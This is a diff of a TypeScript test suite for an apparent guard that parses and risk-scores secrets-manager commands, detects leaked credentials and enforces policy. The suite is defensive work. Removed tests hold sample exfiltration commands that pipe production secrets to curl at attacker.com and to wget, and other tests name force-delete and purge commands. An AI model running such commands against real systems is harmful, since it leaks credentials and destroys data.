@@ -1,601 +1,556 @@
+import { readFileSync } from 'fs';
 import { parseSecretCommand } from '../src/adapters/secrets/parser.js';
-import { detectLeaks, maskSecrets } from '../src/adapters/secrets/leak-detector.js';
-import { SecretSandbox } from '../src/adapters/secrets/sandbox.js';
-import { SecretsAdapter } from '../src/adapters/secrets/adapter.js';
-import type { SafeExecutorConfig } from '../src/types/index.js';
+import { simulateSecretCommand } from '../src/adapters/secrets/sandbox.js';
+import { detectLeaks, maskSecret } from '../src/adapters/secrets/leak-detector.js';
+import { SecretsAdapter, evaluateSecretPolicy } from '../src/adapters/secrets/adapter.js';
+import type { SecretPolicy } from '../src/adapters/secrets/types.js';
 
-// ─── Parser ──────────────────────────────────────────────────────────────────
+// ─── Fixtures ──────────────────────────────────────────────────────────────────
 
-describe('parseSecretCommand', () => {
-  describe('HashiCorp Vault', () => {
-    it('parses vault kv get', () => {
-      const r = parseSecretCommand('vault kv get secret/myapp/api-key');
-      expect(r.tool).toBe('vault');
-      expect(r.action).toBe('read');
-      expect(r.secretPath).toBe('secret/myapp/api-key');
-      expect(r.isWildcard).toBe(false);
-    });
+const defaultPolicy = JSON.parse(
+  readFileSync(new URL('../config/policies/secrets-default-policy.json', import.meta.url), 'utf-8'),
+) as SecretPolicy;
 
-    it('parses vault kv get with version', () => {
-      const r = parseSecretCommand('vault kv get -version=3 secret/myapp/api-key');
-      expect(r.action).toBe('read');
-      expect(r.version).toBe('3');
-      expect(r.secretPath).toBe('secret/myapp/api-key');
-    });
+// ─── Parser: tool detection ────────────────────────────────────────────────────
 
-    it('parses vault kv put', () => {
-      const r = parseSecretCommand('vault kv put secret/myapp/db-password');
-      expect(r.tool).toBe('vault');
-      expect(r.action).toBe('write');
-    });
-
-    it('parses vault kv put with inline value', () => {
-      const r = parseSecretCommand('vault kv put secret/myapp/db-password value=supersecret');
-      expect(r.hasPlaintextSecret).toBe(true);
-    });
-
-    it('parses vault kv delete', () => {
-      const r = parseSecretCommand('vault kv delete secret/prod/api-key');
-      expect(r.action).toBe('delete');
-      expect(r.environment).toBe('production');
-    });
-
-    it('parses vault kv list with wildcard', () => {
-      const r = parseSecretCommand('vault kv list secret/');
-      expect(r.action).toBe('list');
-      expect(r.isWildcard).toBe(true);
-    });
-
-    it('parses vault read', () => {
-      const r = parseSecretCommand('vault read secret/staging/token');
-      expect(r.tool).toBe('vault');
-      expect(r.action).toBe('read');
-      expect(r.environment).toBe('staging');
-    });
-
-    it('parses vault list at root', () => {
-      const r = parseSecretCommand('vault list /');
-      expect(r.action).toBe('list');
-      expect(r.isWildcard).toBe(true);
-    });
+describe('parseSecretCommand — tool detection', () => {
+  test('detects HashiCorp Vault', () => {
+    const r = parseSecretCommand('vault read secret/data/myapp/db-password');
+    expect(r.tool).toBe('vault');
+    expect(r.action).toBe('read');
   });
 
-  describe('AWS Secrets Manager', () => {
-    it('parses get-secret-value', () => {
-      const r = parseSecretCommand(
-        'aws secretsmanager get-secret-value --secret-id myapp/prod-db',
-      );
-      expect(r.tool).toBe('aws-secrets-manager');
-      expect(r.action).toBe('read');
-      expect(r.secretPath).toBe('myapp/prod-db');
-      expect(r.environment).toBe('production');
-    });
-
-    it('parses create-secret', () => {
-      const r = parseSecretCommand(
-        'aws secretsmanager create-secret --name myapp/staging-api-key',
-      );
-      expect(r.action).toBe('write');
-      expect(r.secretPath).toBe('myapp/staging-api-key');
-    });
-
-    it('parses delete-secret', () => {
-      const r = parseSecretCommand(
-        'aws secretsmanager delete-secret --secret-id myapp/prod-db',
-      );
-      expect(r.action).toBe('delete');
-    });
-
-    it('parses list-secrets as wildcard', () => {
-      const r = parseSecretCommand('aws secretsmanager list-secrets');
-      expect(r.action).toBe('list');
-      expect(r.isWildcard).toBe(true);
-    });
-
-    it('parses rotate-secret', () => {
-      const r = parseSecretCommand(
-        'aws secretsmanager rotate-secret --secret-id myapp/prod-db',
-      );
-      expect(r.action).toBe('rotate');
-    });
-
-    it('detects raw output via --query SecretString', () => {
-      const r = parseSecretCommand(
-        'aws secretsmanager get-secret-value --secret-id myapp/prod-db --query SecretString',
-      );
-      expect(r.isRawOutput).toBe(true);
-    });
+  test('detects AWS Secrets Manager', () => {
+    const r = parseSecretCommand('aws secretsmanager get-secret-value --secret-id prod/db-password');
+    expect(r.tool).toBe('aws-secrets');
+    expect(r.action).toBe('read');
   });
 
-  describe('AWS SSM Parameter Store', () => {
-    it('parses get-parameter', () => {
-      const r = parseSecretCommand('aws ssm get-parameter --name /myapp/prod/db-password');
-      expect(r.tool).toBe('aws-ssm');
-      expect(r.action).toBe('read');
-      expect(r.secretPath).toBe('/myapp/prod/db-password');
-    });
-
-    it('parses put-parameter with inline value', () => {
-      const r = parseSecretCommand(
-        'aws ssm put-parameter --name /myapp/dev/token --value mynewtoken123456',
-      );
-      expect(r.action).toBe('write');
-      expect(r.hasPlaintextSecret).toBe(true);
-    });
-
-    it('parses get-parameters-by-path as list', () => {
-      const r = parseSecretCommand(
-        'aws ssm get-parameters-by-path --path /myapp/prod/',
-      );
-      expect(r.action).toBe('list');
-      expect(r.secretPath).toBe('/myapp/prod/');
-    });
+  test('detects AWS SSM Parameter Store', () => {
+    const r = parseSecretCommand('aws ssm get-parameter --name /app/config/api-key --with-decryption');
+    expect(r.tool).toBe('aws-ssm');
+    expect(r.action).toBe('read');
   });
 
-  describe('GCP Secret Manager', () => {
-    it('parses gcloud secrets versions access', () => {
-      const r = parseSecretCommand(
-        'gcloud secrets versions access latest --secret=my-prod-secret',
-      );
-      expect(r.tool).toBe('gcp-secret-manager');
-      expect(r.action).toBe('read');
-      expect(r.secretPath).toBe('my-prod-secret');
-      expect(r.version).toBe('latest');
-    });
-
-    it('parses gcloud secrets create', () => {
-      const r = parseSecretCommand('gcloud secrets create my-new-secret');
-      expect(r.action).toBe('write');
-      expect(r.secretPath).toBe('my-new-secret');
-    });
-
-    it('parses gcloud secrets delete', () => {
-      const r = parseSecretCommand('gcloud secrets delete my-prod-secret');
-      expect(r.action).toBe('delete');
-    });
-
-    it('parses gcloud secrets list as wildcard', () => {
-      const r = parseSecretCommand('gcloud secrets list');
-      expect(r.action).toBe('list');
-      expect(r.isWildcard).toBe(true);
-    });
+  test('detects GCloud Secret Manager', () => {
+    const r = parseSecretCommand('gcloud secrets versions access latest --secret=my-api-key');
+    expect(r.tool).toBe('gcloud-secrets');
+    expect(r.action).toBe('read');
   });
 
-  describe('Azure Key Vault', () => {
-    it('parses az keyvault secret show', () => {
-      const r = parseSecretCommand(
-        'az keyvault secret show --name MySecret --vault-name MyVault',
-      );
-      expect(r.tool).toBe('azure-key-vault');
-      expect(r.action).toBe('read');
-      expect(r.secretPath).toBe('MySecret');
-    });
-
-    it('parses az keyvault secret set with inline value', () => {
-      const r = parseSecretCommand(
-        'az keyvault secret set --name MySecret --vault-name MyVault --value SuperSecret123',
-      );
-      expect(r.action).toBe('write');
-      expect(r.hasPlaintextSecret).toBe(true);
-    });
-
-    it('parses az keyvault secret delete', () => {
-      const r = parseSecretCommand(
-        'az keyvault secret delete --name MySecret --vault-name MyVault',
-      );
-      expect(r.action).toBe('delete');
-    });
-
-    it('parses az keyvault secret list as wildcard', () => {
-      const r = parseSecretCommand('az keyvault secret list --vault-name MyVault');
-      expect(r.action).toBe('list');
-      expect(r.isWildcard).toBe(true);
-    });
+  test('detects Azure Key Vault', () => {
+    const r = parseSecretCommand('az keyvault secret show --name db-password --vault-name prod-vault');
+    expect(r.tool).toBe('az-keyvault');
+    expect(r.action).toBe('read');
   });
 
-  describe('Kubernetes Secrets', () => {
-    it('parses kubectl get secret', () => {
-      const r = parseSecretCommand('kubectl get secret my-secret');
-      expect(r.tool).toBe('kubernetes');
-      expect(r.action).toBe('read');
-      expect(r.secretPath).toBe('my-secret');
-    });
-
-    it('detects raw output on kubectl get secret -o yaml', () => {
-      const r = parseSecretCommand('kubectl get secret my-secret -o yaml');
-      expect(r.isRawOutput).toBe(true);
-    });
-
-    it('parses kubectl create secret with from-literal as plaintext', () => {
-      const r = parseSecretCommand(
-        'kubectl create secret generic my-secret --from-literal=password=mysecret123',
-      );
-      expect(r.action).toBe('write');
-      expect(r.hasPlaintextSecret).toBe(true);
-    });
-
-    it('parses kubectl create secret with from-file (no plaintext)', () => {
-      const r = parseSecretCommand(
-        'kubectl create secret generic my-secret --from-file=./secret.txt',
-      );
-      expect(r.action).toBe('write');
-      expect(r.hasPlaintextSecret).toBe(false);
-    });
-
-    it('parses kubectl delete secret', () => {
-      const r = parseSecretCommand('kubectl delete secret my-secret');
-      expect(r.action).toBe('delete');
-    });
-
-    it('parses kubectl get secrets (all) as wildcard', () => {
-      const r = parseSecretCommand('kubectl get secrets');
-      expect(r.action).toBe('read');
-      expect(r.isWildcard).toBe(true); // empty path = wildcard
-    });
+  test('detects kubectl secrets', () => {
+    const r = parseSecretCommand('kubectl get secret db-credentials -n production');
+    expect(r.tool).toBe('kubectl-secrets');
+    expect(r.action).toBe('read');
   });
 
-  describe('Docker Secrets', () => {
-    it('parses docker secret create', () => {
-      const r = parseSecretCommand('docker secret create my-secret ./secret.txt');
-      expect(r.tool).toBe('docker');
-      expect(r.action).toBe('write');
-      expect(r.secretPath).toBe('my-secret');
-    });
-
-    it('parses docker secret rm', () => {
-      const r = parseSecretCommand('docker secret rm my-secret');
-      expect(r.action).toBe('delete');
-    });
-
-    it('parses docker secret ls as wildcard', () => {
-      const r = parseSecretCommand('docker secret ls');
-      expect(r.action).toBe('list');
-      expect(r.isWildcard).toBe(true);
-    });
+  test('detects docker secrets', () => {
+    const r = parseSecretCommand('docker secret create my-secret ./secret.txt');
+    expect(r.tool).toBe('docker-secrets');
+    expect(r.action).toBe('create');
   });
 
-  describe('Environment variables', () => {
-    it('parses export with value as plaintext', () => {
-      const r = parseSecretCommand('export MY_SECRET=supersecretvalue');
-      expect(r.tool).toBe('env');
-      expect(r.action).toBe('write');
-      expect(r.hasPlaintextSecret).toBe(true);
-      expect(r.secretPath).toBe('MY_SECRET');
-    });
+  test('detects env export', () => {
+    const r = parseSecretCommand('export API_KEY=abc123');
+    expect(r.tool).toBe('env-export');
+    expect(r.action).toBe('export');
   });
 
-  describe('Environment detection', () => {
-    it('detects production from path', () => {
-      const r = parseSecretCommand('vault kv get secret/prod/api-key');
-      expect(r.environment).toBe('production');
-    });
-
-    it('detects staging from path', () => {
-      const r = parseSecretCommand('vault kv get secret/staging/api-key');
-      expect(r.environment).toBe('staging');
-    });
-
-    it('detects development from path', () => {
-      const r = parseSecretCommand('vault kv get secret/dev/api-key');
-      expect(r.environment).toBe('development');
-    });
-
-    it('returns unknown for unclassified paths', () => {
-      const r = parseSecretCommand('vault kv get secret/myapp/api-key');
-      expect(r.environment).toBe('unknown');
-    });
+  test('returns unknown for unrecognized commands', () => {
+    const r = parseSecretCommand('some-random-tool get-secret');
+    expect(r.tool).toBe('unknown');
   });
 
-  it('throws on empty command', () => {
-    expect(() => parseSecretCommand('')).toThrow('empty command');
+  test('throws on empty command', () => {
+    expect(() => parseSecretCommand('')).toThrow('Empty command');
   });
 });
 
-// ─── Leak Detector ───────────────────────────────────────────────────────────
+// ─── Parser: action detection ──────────────────────────────────────────────────
+
+describe('parseSecretCommand — action detection', () => {
+  test('Vault write', () => {
+    const r = parseSecretCommand('vault write secret/data/myapp api_key=abc123');
+    expect(r.action).toBe('write');
+  });
+
+  test('Vault delete', () => {
+    const r = parseSecretCommand('vault delete secret/data/myapp');
+    expect(r.action).toBe('delete');
+  });
+
+  test('Vault list', () => {
+    const r = parseSecretCommand('vault list secret/data/myapp/');
+    expect(r.action).toBe('list');
+  });
+
+  test('AWS create-secret', () => {
+    const r = parseSecretCommand('aws secretsmanager create-secret --name my-secret --secret-string "abc"');
+    expect(r.action).toBe('create');
+  });
+
+  test('AWS delete-secret', () => {
+    const r = parseSecretCommand('aws secretsmanager delete-secret --secret-id my-secret');
+    expect(r.action).toBe('delete');
+  });
+
+  test('AWS rotate-secret', () => {
+    const r = parseSecretCommand('aws secretsmanager rotate-secret --secret-id my-secret');
+    expect(r.action).toBe('rotate');
+  });
+
+  test('AWS list-secrets', () => {
+    const r = parseSecretCommand('aws secretsmanager list-secrets');
+    expect(r.action).toBe('list');
+  });
+
+  test('AWS SSM put-parameter', () => {
+    const r = parseSecretCommand('aws ssm put-parameter --name /app/key --value "xyz" --overwrite');
+    expect(r.action).toBe('write');
+    expect(r.isOverwrite).toBe(true);
+  });
+
+  test('AWS SSM delete-parameter', () => {
+    const r = parseSecretCommand('aws ssm delete-parameter --name /app/key');
+    expect(r.action).toBe('delete');
+  });
+
+  test('GCloud create secret', () => {
+    const r = parseSecretCommand('gcloud secrets create my-secret --data-file=./secret.txt');
+    expect(r.action).toBe('create');
+  });
+
+  test('GCloud delete secret', () => {
+    const r = parseSecretCommand('gcloud secrets delete my-secret');
+    expect(r.action).toBe('delete');
+  });
+
+  test('GCloud list secrets', () => {
+    const r = parseSecretCommand('gcloud secrets list');
+    expect(r.action).toBe('list');
+  });
+
+  test('Azure Key Vault set', () => {
+    const r = parseSecretCommand('az keyvault secret set --name api-key --vault-name myvault --value "abc"');
+    expect(r.action).toBe('write');
+  });
+
+  test('Azure Key Vault delete', () => {
+    const r = parseSecretCommand('az keyvault secret delete --name api-key --vault-name myvault');
+    expect(r.action).toBe('delete');
+  });
+
+  test('Azure Key Vault list', () => {
+    const r = parseSecretCommand('az keyvault secret list --vault-name myvault');
+    expect(r.action).toBe('list');
+  });
+
+  test('kubectl create secret', () => {
+    const r = parseSecretCommand('kubectl create secret generic my-secret --from-literal=key=value');
+    expect(r.action).toBe('create');
+  });
+
+  test('kubectl delete secret', () => {
+    const r = parseSecretCommand('kubectl delete secret my-secret');
+    expect(r.action).toBe('delete');
+  });
+
+  test('docker secret inspect', () => {
+    const r = parseSecretCommand('docker secret inspect my-secret');
+    expect(r.action).toBe('read');
+  });
+
+  test('docker secret rm', () => {
+    const r = parseSecretCommand('docker secret rm my-secret');
+    expect(r.action).toBe('delete');
+  });
+
+  test('docker secret ls', () => {
+    const r = parseSecretCommand('docker secret ls');
+    expect(r.action).toBe('list');
+  });
+});
+
+// ─── Parser: risk classification ───────────────────────────────────────────────
+
+describe('parseSecretCommand — risk classification', () => {
+  test('read is LOW risk', () => {
+    const r = parseSecretCommand('vault read secret/data/myapp/key');
+    expect(r.riskLevel).toBe('LOW');
+  });
+
+  test('list is MEDIUM risk (namespace scope escalation)', () => {
+    const r = parseSecretCommand('aws secretsmanager list-secrets');
+    expect(r.riskLevel).toBe('MEDIUM');
+  });
+
+  test('write is MEDIUM risk', () => {
+    const r = parseSecretCommand('vault write secret/data/myapp key=value');
+    expect(r.riskLevel).toBe('MEDIUM');
+  });
+
+  test('delete is HIGH risk', () => {
+    const r = parseSecretCommand('vault delete secret/data/myapp');
+    expect(r.riskLevel).toBe('HIGH');
+  });
+
+  test('production write is HIGH risk', () => {
+    const r = parseSecretCommand('vault write secret/data/production/db password=abc');
+    expect(r.riskLevel).toBe('HIGH');
+  });
+
+  test('force-delete-without-recovery is CRITICAL', () => {
+    const r = parseSecretCommand('aws secretsmanager delete-secret --secret-id my-secret --force-delete-without-recovery');
+    expect(r.riskLevel).toBe('CRITICAL');
+  });
+});
+
+// ─── Parser: production detection ──────────────────────────────────────────────
+
+describe('parseSecretCommand — production detection', () => {
+  test('detects production in secret path', () => {
+    const r = parseSecretCommand('vault read secret/data/production/db-password');
+    expect(r.isProduction).toBe(true);
+  });
+
+  test('detects prod in vault-name', () => {
+    const r = parseSecretCommand('az keyvault secret show --name key --vault-name prod-vault');
+    expect(r.isProduction).toBe(true);
+  });
+
+  test('non-production path', () => {
+    const r = parseSecretCommand('vault read secret/data/staging/db-password');
+    expect(r.isProduction).toBe(false);
+  });
+});
+
+// ─── Parser: dangerous patterns ────────────────────────────────────────────────
+
+describe('parseSecretCommand — dangerous patterns', () => {
+  test('detects force-delete-without-recovery', () => {
+    const r = parseSecretCommand('aws secretsmanager delete-secret --secret-id x --force-delete-without-recovery');
+    expect(r.dangerousPatterns).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({ pattern: '--force-delete-without-recovery', severity: 'DENY' }),
+      ]),
+    );
+  });
+
+  test('detects purge', () => {
+    const r = parseSecretCommand('az keyvault secret purge --name key --vault-name myvault');
+    expect(r.dangerousPatterns).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({ pattern: 'purge', severity: 'DENY' }),
+      ]),
+    );
+  });
+
+  test('detects piping secret to another command', () => {
+    const r = parseSecretCommand('vault read secret/data/key | jq .data');
+    expect(r.dangerousPatterns).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({ pattern: 'pipe-secret' }),
+      ]),
+    );
+  });
+
+  test('detects redirect to file', () => {
+    const r = parseSecretCommand('vault read secret/data/key > /tmp/secret.txt');
+    expect(r.dangerousPatterns).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({ pattern: 'redirect-to-file' }),
+      ]),
+    );
+  });
+
+  test('detects --force flag', () => {
+    const r = parseSecretCommand('vault delete --force secret/data/key');
+    expect(r.isForce).toBe(true);
+    expect(r.dangerousPatterns).toEqual(
+      expect.arrayContaining([
+        expect.objectContaining({ pattern: '--force' }),
+      ]),
+    );
+  });
+});
+
+// ─── Leak Detector ─────────────────────────────────────────────────────────────
 
 describe('detectLeaks', () => {
-  it('detects AWS access key ID', () => {
-    const result = detectLeaks('aws configure --aws-access-key-id AKIAIOSFODNN7EXAMPLE');
-    expect(result.hasLeak).toBe(true);
-    expect(result.patterns.some((p) => p.startsWith('aws-access-key-id'))).toBe(true);
-    expect(result.masked).not.toContain('AKIAIOSFODNN7EXAMPLE');
+  test('detects AWS access key', () => {
+    const result = detectLeaks('AKIAIOSFODNN7EXAMPLE');
+    expect(result.hasLeaks).toBe(true);
+    expect(result.leaks[0].type).toBe('aws-access-key');
   });
 
-  it('detects GitHub token', () => {
-    // ghp_ followed by exactly 36 alphanumeric chars
-    const result = detectLeaks('git push --token ghp_abcdefghijklmnopqrstuvwxyz1234567890');
-    expect(result.hasLeak).toBe(true);
-    expect(result.patterns.some((p) => p.startsWith('github-token'))).toBe(true);
+  test('detects GitHub PAT (classic)', () => {
+    const result = detectLeaks('ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij');
+    expect(result.hasLeaks).toBe(true);
+    expect(result.leaks[0].type).toBe('github-pat');
   });
 
-  it('detects JWT token', () => {
-    const jwt = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c';
-    const result = detectLeaks(`curl -H "Authorization: Bearer ${jwt}" https://api.example.com`);
-    expect(result.hasLeak).toBe(true);
-    expect(result.patterns.some((p) => p.startsWith('jwt-token'))).toBe(true);
+  test('detects GitHub PAT (fine-grained)', () => {
+    const result = detectLeaks('github_pat_11ABCDEFGH0123456789_abcdefghijklmnopqrstuvwxyz');
+    expect(result.hasLeaks).toBe(true);
+    expect(result.leaks[0].type).toBe('github-pat');
   });
 
-  it('detects private key marker', () => {
-    const result = detectLeaks('echo "-----BEGIN RSA PRIVATE KEY-----" >> key.pem');
-    expect(result.hasLeak).toBe(true);
-    expect(result.patterns.some((p) => p.startsWith('private-key-marker'))).toBe(true);
+  test('detects JWT', () => {
+    const jwt = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIn0.dozjgNryP4J3jVmNHl0w5N_XgL0n3I9PlFUP0THsR8U';
+    const result = detectLeaks(jwt);
+    expect(result.hasLeaks).toBe(true);
+    expect(result.leaks[0].type).toBe('jwt');
   });
 
-  it('detects exfiltration via pipe to curl', () => {
-    const result = detectLeaks('vault kv get secret/prod/api-key | curl -X POST https://attacker.com');
-    expect(result.isExfiltration).toBe(true);
+  test('detects private key', () => {
+    const pk = '-----BEGIN RSA PRIVATE KEY-----\nMIIBogIBAAJBALOQZVW28xB+hXz\n-----END RSA PRIVATE KEY-----';
+    const result = detectLeaks(pk);
+    expect(result.hasLeaks).toBe(true);
+    expect(result.leaks[0].type).toBe('private-key');
   });
 
-  it('detects exfiltration via file redirect', () => {
-    const result = detectLeaks('vault kv get secret/prod/api-key >> /tmp/secrets.txt');
-    expect(result.isExfiltration).toBe(true);
+  test('returns no leaks for clean text', () => {
+    const result = detectLeaks('just a normal string with no secrets');
+    expect(result.hasLeaks).toBe(false);
+    expect(result.leaks).toHaveLength(0);
   });
 
-  it('detects exfiltration via pipe to wget', () => {
-    const result = detectLeaks('aws secretsmanager get-secret-value | wget -q -O- --post-data=-');
-    expect(result.isExfiltration).toBe(true);
-  });
-
-  it('does not flag /dev/null redirect', () => {
-    const result = detectLeaks('vault kv get secret/myapp/key >> /dev/null');
-    expect(result.isExfiltration).toBe(false);
-  });
-
-  it('returns no leak for clean commands', () => {
-    const result = detectLeaks('vault kv get secret/myapp/api-key');
-    expect(result.hasLeak).toBe(false);
-    expect(result.isExfiltration).toBe(false);
-    expect(result.masked).toBe('vault kv get secret/myapp/api-key');
-  });
-
-  it('masks the secret value in output', () => {
-    const result = maskSecrets('aws secretsmanager get-secret-value --secret-id myapp AKIAIOSFODNN7EXAMPLE');
-    expect(result).toContain('[REDACTED]');
-    expect(result).not.toContain('AKIAIOSFODNN7EXAMPLE');
+  test('detects multiple leaks in one string', () => {
+    const input = 'key=AKIAIOSFODNN7EXAMPLE token=ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij';
+    const result = detectLeaks(input);
+    expect(result.hasLeaks).toBe(true);
+    expect(result.leaks.length).toBeGreaterThanOrEqual(2);
   });
 });
 
-// ─── Sandbox ─────────────────────────────────────────────────────────────────
-
-describe('SecretSandbox', () => {
-  const sandbox = new SecretSandbox();
-
-  it('returns feasible for read operations', () => {
-    const parsed = parseSecretCommand('vault kv get secret/myapp/api-key');
-    const result = sandbox.simulate(parsed);
-    expect(result.feasible).toBe(true);
-    expect(result.plan).toContain('Would read');
+describe('maskSecret', () => {
+  test('masks long secrets keeping first/last 4 chars', () => {
+    expect(maskSecret('AKIAIOSFODNN7EXAMPLE')).toBe('AKIA************MPLE');
   });
 
-  it('returns feasible for write operations', () => {
-    const parsed = parseSecretCommand('vault kv put secret/myapp/db-password');
-    const result = sandbox.simulate(parsed);
-    expect(result.feasible).toBe(true);
-    expect(result.plan).toContain('Would write');
+  test('fully masks short secrets', () => {
+    expect(maskSecret('short')).toBe('*****');
   });
 
-  it('returns feasible for delete with specific path', () => {
-    const parsed = parseSecretCommand('vault kv delete secret/myapp/old-key');
-    const result = sandbox.simulate(parsed);
-    expect(result.feasible).toBe(true);
-    expect(result.plan).toContain('Would delete');
-    expect(result.plan).toContain('irreversible');
+  test('fully masks 12-char boundary', () => {
+    expect(maskSecret('123456789012')).toBe('************');
   });
 
-  it('returns feasible for rotate', () => {
-    const parsed = parseSecretCommand('aws secretsmanager rotate-secret --secret-id myapp/prod-db');
-    const result = sandbox.simulate(parsed);
-    expect(result.feasible).toBe(true);
-    expect(result.plan).toContain('rotate');
-  });
-
-  it('returns feasible for list operations', () => {
-    const parsed = parseSecretCommand('vault kv list secret/myapp/');
-    const result = sandbox.simulate(parsed);
-    expect(result.feasible).toBe(true);
-    expect(result.plan).toContain('list');
-  });
-
-  it('DENIES raw output on production secret', () => {
-    const parsed = parseSecretCommand('kubectl get secret my-prod-secret -o yaml');
-    // Manually set environment to production (kubectl -o yaml in prod path)
-    const prodParsed = { ...parsed, environment: 'production' as const };
-    const result = sandbox.simulate(prodParsed);
-    expect(result.feasible).toBe(false);
-    expect(result.plan).toContain('DENIED');
-    expect(result.plan).toContain('Raw output');
-  });
-
-  it('DENIES wildcard delete', () => {
-    const parsed = parseSecretCommand('vault kv delete secret/');
-    const result = sandbox.simulate(parsed);
-    expect(result.feasible).toBe(false);
-    expect(result.plan).toContain('DENIED');
-    expect(result.plan).toContain('Wildcard delete');
-  });
-
-  it('warns about wildcard listing on production', () => {
-    const parsed = parseSecretCommand('vault list /');
-    const prodParsed = { ...parsed, environment: 'production' as const };
-    const result = sandbox.simulate(prodParsed);
-    expect(result.feasible).toBe(true);
-    expect(result.validationErrors.length).toBeGreaterThan(0);
-  });
-
-  it('respects environment override from options', () => {
-    const forcedProdSandbox = new SecretSandbox({ environment: 'production' });
-    const parsed = parseSecretCommand('kubectl get secret my-secret -o yaml');
-    const result = forcedProdSandbox.simulate(parsed);
-    expect(result.feasible).toBe(false); // forced prod + raw output = DENY
+  test('partially masks 13-char value', () => {
+    const masked = maskSecret('1234567890123');
+    expect(masked).toBe('1234*****0123');
   });
 });
 
-// ─── Adapter ─────────────────────────────────────────────────────────────────
+// ─── Sandbox ───────────────────────────────────────────────────────────────────
 
-const mockConfig: SafeExecutorConfig = {
-  version: '1.0',
-  environment: 'development',
-  executor: 'test',
-  database: {
-    adapter: 'postgres',
-    connectionString: '',
-    maxRowsThreshold: 1000,
-  },
-  policy: { file: '', strictMode: false },
-  approval: { mode: 'auto', timeoutSeconds: 60 },
-  audit: { enabled: false, output: 'console' },
-};
+describe('simulateSecretCommand', () => {
+  test('denies DENY-severity patterns', async () => {
+    const parsed = parseSecretCommand('aws secretsmanager delete-secret --secret-id x --force-delete-without-recovery');
+    const result = await simulateSecretCommand(parsed);
+    expect(result.feasible).toBe(false);
+    expect(result.summary).toContain('DENIED');
+  });
+
+  test('denies production delete', async () => {
+    const parsed = parseSecretCommand('vault delete secret/data/production/key');
+    const result = await simulateSecretCommand(parsed);
+    expect(result.feasible).toBe(false);
+    expect(result.summary).toContain('DENIED');
+  });
+
+  test('allows non-destructive list', async () => {
+    const parsed = parseSecretCommand('aws secretsmanager list-secrets');
+    const result = await simulateSecretCommand(parsed);
+    expect(result.feasible).toBe(true);
+  });
+
+  test('warns about value exposure', async () => {
+    const parsed = parseSecretCommand('vault read secret/data/myapp/key');
+    const result = await simulateSecretCommand(parsed);
+    expect(result.feasible).toBe(true);
+    expect(result.warnings).toEqual(
+      expect.arrayContaining([expect.stringContaining('expose')]),
+    );
+  });
+
+  test('warns about production target', async () => {
+    const parsed = parseSecretCommand('vault read secret/data/production/key');
+    const result = await simulateSecretCommand(parsed);
+    expect(result.warnings).toEqual(
+      expect.arrayContaining([expect.stringContaining('PRODUCTION')]),
+    );
+  });
+
+  test('warns about force flag', async () => {
+    const parsed = parseSecretCommand('vault delete --force secret/data/staging/key');
+    const result = await simulateSecretCommand(parsed);
+    expect(result.warnings).toEqual(
+      expect.arrayContaining([expect.stringContaining('Force flag')]),
+    );
+  });
+
+  test('warns about overwrite', async () => {
+    const parsed = parseSecretCommand('aws ssm put-parameter --name /app/key --value "new" --overwrite');
+    const result = await simulateSecretCommand(parsed);
+    expect(result.warnings).toEqual(
+      expect.arrayContaining([expect.stringContaining('overwrite')]),
+    );
+  });
+
+  test('detects inline leaks in command', async () => {
+    const parsed = parseSecretCommand('vault write secret/data/myapp api_key=ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghij');
+    const result = await simulateSecretCommand(parsed);
+    expect(result.warnings).toEqual(
+      expect.arrayContaining([expect.stringContaining('secret')]),
+    );
+  });
+});
+
+// ─── Policy evaluator ──────────────────────────────────────────────────────────
+
+describe('evaluateSecretPolicy', () => {
+  test('denies force delete via policy', () => {
+    const parsed = parseSecretCommand('aws secretsmanager delete-secret --secret-id x --force');
+    const decision = evaluateSecretPolicy(parsed, defaultPolicy);
+    expect(decision.allowed).toBe(false);
+  });
+
+  test('denies production delete via policy', () => {
+    const parsed = parseSecretCommand('vault delete secret/data/production/key');
+    const decision = evaluateSecretPolicy(parsed, defaultPolicy);
+    expect(decision.allowed).toBe(false);
+  });
+
+  test('requires approval for production write', () => {
+    const parsed = parseSecretCommand('vault write secret/data/production/db password=abc');
+    const decision = evaluateSecretPolicy(parsed, defaultPolicy);
+    expect(decision.requiresApproval).toBe(true);
+  });
+
+  test('requires approval for rotation', () => {
+    const parsed = parseSecretCommand('aws secretsmanager rotate-secret --secret-id my-secret');
+    const decision = evaluateSecretPolicy(parsed, defaultPolicy);
+    expect(decision.requiresApproval).toBe(true);
+  });
+
+  test('requires dry-run for secret write', () => {
+    const parsed = parseSecretCommand('vault write secret/data/staging/key value=abc');
+    const decision = evaluateSecretPolicy(parsed, defaultPolicy);
+    expect(decision.requiresDryRun).toBe(true);
+  });
+
+  test('auto-approves list', () => {
+    const parsed = parseSecretCommand('aws secretsmanager list-secrets');
+    const decision = evaluateSecretPolicy(parsed, defaultPolicy);
+    expect(decision.allowed).toBe(true);
+    expect(decision.riskLevel).toBe('LOW');
+  });
+
+  test('auto-approves env export', () => {
+    const parsed = parseSecretCommand('export API_KEY=test123');
+    const decision = evaluateSecretPolicy(parsed, defaultPolicy);
+    expect(decision.allowed).toBe(true);
+  });
+
+  test('blocks unknown commands when allowUnknown is false', () => {
+    const parsed = parseSecretCommand('some-unknown-tool get-secret foo');
+    const decision = evaluateSecretPolicy(parsed, defaultPolicy);
+    expect(decision.allowed).toBe(false);
+  });
+
+  test('CRITICAL risk forces dry-run + approval', () => {
+    const parsed = parseSecretCommand('vault write secret/data/production/critical-key value=x');
+    const decision = evaluateSecretPolicy(parsed, defaultPolicy);
+    expect(decision.riskLevel).toBe('CRITICAL');
+    expect(decision.requiresDryRun).toBe(true);
+    expect(decision.requiresApproval).toBe(true);
+  });
+});
+
+// ─── Adapter class ─────────────────────────────────────────────────────────────
 
 describe('SecretsAdapter', () => {
-  describe('ping', () => {
-    it('passes with valid options', async () => {
-      const adapter = new SecretsAdapter({ allowedPaths: ['secret/myapp/'] });
-      await expect(adapter.ping()).resolves.toBeUndefined();
-    });
